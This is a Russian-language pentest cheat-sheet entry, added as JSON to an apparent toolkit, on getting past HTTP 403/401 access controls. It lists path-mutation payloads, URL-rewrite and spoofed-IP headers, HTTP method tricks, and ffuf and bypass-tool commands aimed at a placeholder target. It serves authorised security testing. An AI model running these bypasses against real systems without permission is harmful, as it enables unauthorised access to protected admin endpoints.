@@ -1,0 +1,69 @@
+{
+  "category": "Обход 403 / контроль доступа",
+  "source": "SecLists Fuzzing/403 (@jhaddix) + PayloadsAllTheThings/403 Bypass",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Когда и как обходят 403/401",
+      "language": "text",
+      "tags": ["methodology", "403", "bypass", "access-control"],
+      "body": "403/401 часто навешан НЕ там, где обрабатывается запрос: на reverse-proxy / WAF / балансировщике, а бэкенд нормализует путь иначе. На этом и строится обход.\n\nКлассы приёмов:\n1. Мутации пути — прокси видит «/admin» и блокирует, а бэкенд резолвит «/admin/.», «/admin..;/», «/%2e/admin» в тот же ресурс.\n2. Заголовки-оверрайды — прокси доверяет X-Original-URL / X-Rewrite-URL (роут по ним) или IP-заголовкам (X-Forwarded-For: 127.0.0.1) для «только внутренних» эндпоинтов.\n3. Смена метода/версии — ACL стоит только на GET, а POST/HEAD/произвольный метод проходит.\n4. Регистр и расширение — /ADMIN, /admin.json, /admin;.\n\nКак тестировать: берёшь защищённый путь (даёт 403), прогоняешь мутации и заголовки, СЛЕДИШЬ за сменой кода/размера ответа (ffuf -mc all -ac). Не каждый 403 пробивается: настоящий серверный ACL или клиентский редирект так не обойти."
+    },
+    {
+      "subcategory": "Мутации пути",
+      "title": "Топ-приёмы (на примере /admin) — копировать и пробовать",
+      "language": "text",
+      "tags": ["path", "403", "bypass"],
+      "body": "/admin/\n/admin/.\n/admin//\n//admin//\n/./admin/./\n/admin/./\n/admin/..;/\n/admin..;/\n/admin;/\n/..;/admin\n/.;/admin\n/;/admin\n//;//admin\n/%2e/admin\n/admin/%2e/\n/admin%2f\n/admin/%2f\n/admin/%20\n/admin/%09\n/admin%00\n/admin/*\n/admin/~\n/admin~\n/admin.json\n/admin.html\n/admin.css\n/admin?\n/admin#\n/admin/#/\n/admin/..%3b/\n/admin/;%2f..%2f..%2f\n/ADMIN\n/ADM+IN\n/admin/..\\;/"
+    },
+    {
+      "subcategory": "Мутации пути",
+      "title": "Авто-фаззинг мутаций через ffuf",
+      "language": "bash",
+      "tags": ["path", "403", "bypass", "ffuf"],
+      "body": "# Полные листы мутаций уже в этом тулките (⌘K): 403_url_payloads.txt (236 шт.),\n# и в SecLists: /usr/share/seclists/Fuzzing/403/403.md (77 шт. от @jhaddix).\n\n# мутация в хвост пути\nffuf -w 403_url_payloads.txt -u https://target/adminFUZZ -mc all -ac\n# мутация в начало пути\nffuf -w 403_url_payloads.txt -u https://target/FUZZadmin -mc all -ac\n\n# -ac авто-калибрует фон, -mc all показывает все коды — ищи ответ с кодом/размером,\n# отличным от исходного 403 (часто 200/302/401)."
+    },
+    {
+      "subcategory": "Заголовки-оверрайды",
+      "title": "URL-rewrite заголовки — доступ к скрытому пути",
+      "language": "http",
+      "tags": ["header", "403", "bypass", "x-original-url"],
+      "body": "GET / HTTP/1.1\nHost: target\nX-Original-URL: /admin\nX-Rewrite-URL: /admin\nX-Override-URL: /admin\nX-Original-Url: /admin\nRequest-URI: /admin\nReferer: https://target/admin"
+    },
+    {
+      "subcategory": "Заголовки-оверрайды",
+      "title": "Как работают X-Original-URL / X-Rewrite-URL",
+      "language": "text",
+      "tags": ["header", "403", "bypass", "methodology"],
+      "body": "Запрос идёт на разрешённый путь (например «/»), но фронт-энд (Symfony, некоторые конфиги Nginx/IIS, ряд прокси) роутит по значению заголовка X-Original-URL / X-Rewrite-URL. Прокси-ACL проверил «/» (разрешено) → пропустил, а приложение отдало /admin.\nШлёшь по одному заголовку за раз, путь в значении — БЕЗ хоста, начиная со слеша. Сравнивай ответ с прямым запросом /admin (403)."
+    },
+    {
+      "subcategory": "Заголовки-оверрайды",
+      "title": "IP-заголовки — обход «только localhost / внутренний»",
+      "language": "http",
+      "tags": ["header", "403", "bypass", "x-forwarded-for", "ip"],
+      "body": "X-Forwarded-For: 127.0.0.1\nX-Forwarded-Host: localhost\nX-Real-IP: 127.0.0.1\nX-Originating-IP: 127.0.0.1\nX-Remote-IP: 127.0.0.1\nX-Remote-Addr: 127.0.0.1\nX-Client-IP: 127.0.0.1\nX-Custom-IP-Authorization: 127.0.0.1\nX-Host: 127.0.0.1\nClient-IP: 127.0.0.1\nTrue-Client-IP: 127.0.0.1\nForwarded: for=127.0.0.1\n\n# Полный список из 42 заголовков — в тулките (⌘K): 403_header_payloads.txt.\n# Фаззинг: ffuf -w 403_header_payloads.txt:FUZZ -u https://target/admin -H \"FUZZ\" -mc all -ac"
+    },
+    {
+      "subcategory": "Метод и протокол",
+      "title": "Смена HTTP-метода и версии",
+      "language": "bash",
+      "tags": ["method", "403", "bypass"],
+      "body": "# ACL часто стоит только на GET — пробуем другие методы\nfor m in POST HEAD OPTIONS PUT PATCH TRACE DELETE; do\n  printf \"%-7s \" $m\n  curl -s -o /dev/null -w \"%{http_code}\\n\" -X $m https://target/admin\ndone\n\n# Произвольный/мусорный метод (некоторые серверы трактуют как GET)\ncurl -s -X FOO https://target/admin\n\n# Override-заголовки метода\n#   X-HTTP-Method-Override: GET\n#   X-HTTP-Method: GET\n#   X-Method-Override: GET\n\n# Понизить версию протокола (роутинг/ACL по Host могут отвалиться)\ncurl -s --http1.0 https://target/admin"
+    },
+    {
+      "subcategory": "Тулзы",
+      "title": "Автоматизация обхода 403",
+      "language": "bash",
+      "tags": ["tools", "403", "bypass"],
+      "body": "# nomore403 (Go) — пути + методы + заголовки автоматом\ngo install github.com/devploit/nomore403@latest\nnomore403 -u https://target/admin\n\n# byp4xx — verbs / headers / path-mutations в один прогон\ngit clone https://github.com/lobuhi/byp4xx && cd byp4xx\n./byp4xx.sh https://target/admin\n\n# bypass-url-parser (laluka) — максимум URL-мутаций\npipx install bypass-url-parser\nbypass-url-parser -u \"https://target/admin\"\n\n# ffuf с готовыми листами тулкита (⌘K: 403_url_payloads.txt / 403_header_payloads.txt)\nffuf -w 403_url_payloads.txt -u https://target/adminFUZZ -mc all -ac\nffuf -w 403_header_payloads.txt:FUZZ -u https://target/admin -H \"FUZZ\" -mc all -ac\n\n# На стоковой Kali из этих стоят только ffuf/dirsearch — byp4xx/nomore403 ставятся как выше.\n# Burp: расширения «403 Bypasser» / «Bypass-403» (BApp Store)."
+    },
+    {
+      "subcategory": "На заметку",
+      "title": "Признаки обхода и нюансы",
+      "language": "text",
+      "tags": ["methodology", "403", "bypass"],
+      "body": "• Успех = ответ с другим кодом/размером, чем эталонный 403 (обычно 200/302/401, или иной Content-Length).\n• Комбинируй: путь + заголовок + метод сразу (часто срабатывает связка, а не одиночка).\n• Если 403 от WAF (Cloudflare/Akamai/Imperva в Server/заголовках) — это другая история (обход WAF), а не ACL-бэкенда.\n• Бей напрямую по бэкенду/origin-IP или внутреннему порту, минуя прокси, если адрес известен.\n• Пробуй и /path, и /path/ — поведение часто разное.\n• Двойное кодирование (%252e, %252f) проходит там, где одинарное режется прокси.\n• 401 (не 403) — иногда обходится дефолтными/базовыми кредами или тем же IP-заголовком."
+    }
+  ]
+}
